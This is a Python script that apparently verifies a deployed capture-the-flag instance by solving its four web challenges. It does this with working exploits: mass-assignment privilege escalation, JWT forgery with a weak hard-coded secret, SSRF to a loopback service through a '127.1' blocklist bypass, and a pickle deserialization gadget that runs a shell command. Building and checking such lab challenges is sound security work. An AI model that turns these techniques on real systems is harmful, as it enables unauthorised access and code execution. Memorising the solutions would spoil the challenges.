"""Solve all four challenges against a running instance, and say what broke.

    python verify.py https://dm-xxxx.ctf-nm.org

Written for checking a *deployed* instance, because browsing the API by hand
cannot work: every endpoint but `/` and `/healthz` needs a bearer token, so a
browser gets `{"error": "A bearer token is required."}` and that is the API
behaving correctly, not a fault.

Exit code is 0 when all four solve. Anything else prints which step failed and
what came back, so a broken instance can be told apart from a broken platform.
"""

from __future__ import annotations

import base64
import json
import pickle  # noqa: S403 - building the boss payload is the point
import sys
import urllib.error
import urllib.request

DEMO_USER = "t.brennan"
DEMO_PASSWORD = "bureau2019"
ARCHIVIST = "m.calloway"
JWT_SECRET = "changeme"
BOSS_FLAG_PATH = "/tmp/registry/secrets/.flag"
#: The maintenance service's loopback port, and a spelling of localhost the
#: hostname blocklist does not carry.
MAINTENANCE = "http://127.1:9000"

TIMEOUT = 15


def call(url: str, *, method: str = "GET", body: dict | None = None, token: str | None = None):
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = urllib.request.Request(url, data=data, method=method, headers=headers)  # noqa: S310
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT) as response:  # noqa: S310
            return response.status, json.loads(response.read() or b"{}")
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        try:
            return exc.code, json.loads(raw or b"{}")
        except ValueError:
            return exc.code, {"body": raw.decode("utf-8", "replace")[:400]}


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def resign(token: str, subject: str) -> str:
    """Re-sign the token for another user — challenge 2, without PyJWT."""
    import hashlib
    import hmac

    header, payload, _ = token.split(".")
    claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
    claims["sub"] = subject
    body = f"{header}.{b64url(json.dumps(claims, separators=(',', ':')).encode())}"
    signature = hmac.new(JWT_SECRET.encode(), body.encode(), hashlib.sha256).digest()
    return f"{body}.{b64url(signature)}"


def boss_payload() -> str:
    class Gadget:
        def __reduce__(self):
            import subprocess

            return (subprocess.check_output, (["cat", BOSS_FLAG_PATH],))

    return base64.b64encode(pickle.dumps(Gadget())).decode()


def main(base: str) -> int:
    base = base.rstrip("/")
    failures: list[str] = []

    def check(name: str, ok: bool, detail: object = "") -> None:
        print(f"  {'PASS' if ok else 'FAIL'}  {name}" + (f" — {detail}" if not ok else ""))
        if not ok:
            failures.append(name)

    print(f"Verifying {base}")

    status, root = call(f"{base}/")
    check("the API answers", status == 200, f"HTTP {status}: {root}")
    status, health = call(f"{base}/healthz")
    check(
        "the maintenance service is up",
        status == 200 and health.get("maintenance") is True,
        f"HTTP {status}: {health} — challenges 3 and 4 need it",
    )

    status, login = call(
        f"{base}/api/login",
        method="POST",
        body={"username": DEMO_USER, "password": DEMO_PASSWORD},
    )
    if status != 200:
        check("sign in", False, f"HTTP {status}: {login}")
        print("\ncannot continue without a token")
        return 1
    token = login["token"]
    check("sign in", True)

    # 1 — mass assignment.
    call(f"{base}/api/profile", method="PATCH", body={"role": "admin"}, token=token)
    status, audit = call(f"{base}/api/admin/audit", token=token)
    flag1 = audit.get("audit_note", "")
    check("1. Promoted", status == 200 and flag1.startswith("flag{"), f"HTTP {status}: {audit}")

    # 2 — JWT forgery.
    status, mine = call(f"{base}/api/records/mine", token=resign(token, ARCHIVIST))
    bodies = " ".join(r.get("body", "") for r in mine.get("records", []))
    check("2. Signed By Me", "flag{" in bodies, f"HTTP {status}: {mine}")

    # 3 — SSRF to loopback.
    status, fetched = call(
        f"{base}/api/fetch",
        method="POST",
        body={"url": f"{MAINTENANCE}/status/flag"},
        token=token,
    )
    check("3. Fetch It For Me", "flag{" in str(fetched.get("body", "")), f"HTTP {status}: {fetched}")

    # 4 — the boss. Needs an admin token carried inward on the fetch.
    admin = call(
        f"{base}/api/login",
        method="POST",
        body={"username": DEMO_USER, "password": DEMO_PASSWORD},
    )[1].get("token", token)
    status, submitted = call(
        f"{base}/api/fetch",
        method="POST",
        body={
            "url": f"{MAINTENANCE}/jobs",
            "method": "POST",
            "body": boss_payload(),
            "headers": {"Authorization": f"Bearer {admin}"},
        },
        token=admin,
    )
    check(
        "4. No Route To It (boss)",
        "flag{" in str(submitted.get("body", "")),
        f"HTTP {status}: {submitted}",
    )

    print()
    if failures:
        print(f"{len(failures)} of 4 challenges are not solvable: {', '.join(failures)}")
        return 1
    print("all four solve against this instance")
    return 0


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(__doc__)
        raise SystemExit(2)
    raise SystemExit(main(sys.argv[1]))
